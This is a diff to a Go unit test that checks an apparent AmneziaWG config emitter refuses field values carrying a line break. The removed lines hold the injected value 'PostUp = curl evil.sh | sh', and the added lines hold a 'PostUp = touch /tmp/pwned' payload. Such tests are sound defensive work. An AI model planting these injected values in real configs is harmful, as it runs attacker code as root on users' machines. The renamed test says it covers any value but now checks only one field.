@@ -241,9 +241,9 @@ func TestAmneziaWGConfigTextPeerFieldOrder(t *testing.T) {
 	})
 }
 
-// A newline in a field that lands unescaped in [Interface] would inject a
-// config line (e.g. a rogue PostUp); the emitter must refuse to render it.
-func TestAmneziaWGConfigTextRejectsNewlineInjection(t *testing.T) {
+// A value carrying a line break would add a line such as a root PostUp to the
+// subscriber's .conf; a node reports server fields that no save path validated.
+func TestAmneziaWGConfigTextRejectsLineBreakInAnyValue(t *testing.T) {
 	server := &amneziawg.ServerSettings{
 		PublicKey:  "serverPub==",
 		PrimaryDNS: "8.8.8.8",
@@ -256,25 +256,9 @@ func TestAmneziaWGConfigTextRejectsNewlineInjection(t *testing.T) {
 		t.Fatalf("clean input did not render: %q", clean)
 	}
 
-	injected := "x\nPostUp = curl evil.sh | sh"
-	cases := []struct {
-		name   string
-		mutate func(s *amneziawg.ServerSettings, c *model.Client) string
-	}{
-		{"privateKey", func(s *amneziawg.ServerSettings, c *model.Client) string { c.PrivateKey = injected; return "peer-1" }},
-		{"primaryDns", func(s *amneziawg.ServerSettings, c *model.Client) string { s.PrimaryDNS = injected; return "peer-1" }},
-		{"secondaryDns", func(s *amneziawg.ServerSettings, c *model.Client) string { s.SecondaryDNS = injected; return "peer-1" }},
-		{"remark", func(s *amneziawg.ServerSettings, c *model.Client) string { return injected }},
-	}
-	for _, tc := range cases {
-		t.Run(tc.name, func(t *testing.T) {
-			s := *server
-			c := *client
-			remark := tc.mutate(&s, &c)
-			if got := amneziaWGConfigText(&s, &c, "203.0.113.7", 51820, remark); got != "" {
-				t.Fatalf("%s with a newline rendered a config:\n%s", tc.name, got)
-			}
-		})
+	server.H1 = "140232109\nPostUp = touch /tmp/pwned"
+	if got := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "peer-1"); got != "" {
+		t.Fatalf("H1 with a line break rendered a config:\n%s", got)
 	}
 }
 
